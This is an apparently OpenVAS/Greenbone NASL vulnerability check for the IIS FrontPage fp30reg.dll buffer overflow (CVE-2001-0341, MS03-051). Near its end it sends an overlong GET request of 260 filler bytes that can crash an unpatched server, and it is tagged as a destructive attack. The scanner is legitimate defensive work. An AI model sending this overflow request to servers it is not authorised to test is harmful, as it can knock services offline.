# SPDX-FileCopyrightText: 2001 John Lampe
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10699");
  script_version("2023-10-10T05:05:41+0000");
  script_tag(name:"last_modification", value:"2023-10-10 05:05:41 +0000 (Tue, 10 Oct 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2001-0341");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Microsoft IIS FrontPage DoS Vulnerability (MS03-051) - Active Check");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2001 John Lampe");
  script_family("Gain a shell remotely");
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("microsoft/iis/http/detected");

  script_xref(name:"URL", value:"https://docs.microsoft.com/en-us/security-updates/securitybulletins/2003/ms03-051");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2906");

  script_tag(name:"solution", value:"Install either SP4 for Windows 2000 or apply the fix described
  in Microsoft Bulletin MS03-051");

  script_tag(name:"summary", value:"Microsoft IIS, running Frontpage extensions, is vulnerable to a remote
  buffer overflow attack.");

  script_tag(name:"impact", value:"An attacker, exploiting this bug, may gain access to confidential data,
  critical business processes, and elevated privileges on the attached network.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

host = http_host_name(port:port);

req = string("HEAD / HTTP/1.0\r\n", "Host: ", host, "\r\n\r\n");
res = http_send_recv(port:port, data:req);
if(!res) exit(0);

url = "/_vti_bin/_vti_aut/fp30reg.dll?" + crap(260);
req = string("GET ", url, " HTTP/1.0\r\n", "Host: ", host, "\r\n\r\n");
res = http_send_recv(port:port, data:req);

match = egrep(pattern:".*The remote procedure call failed*", string:res);
if(match) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
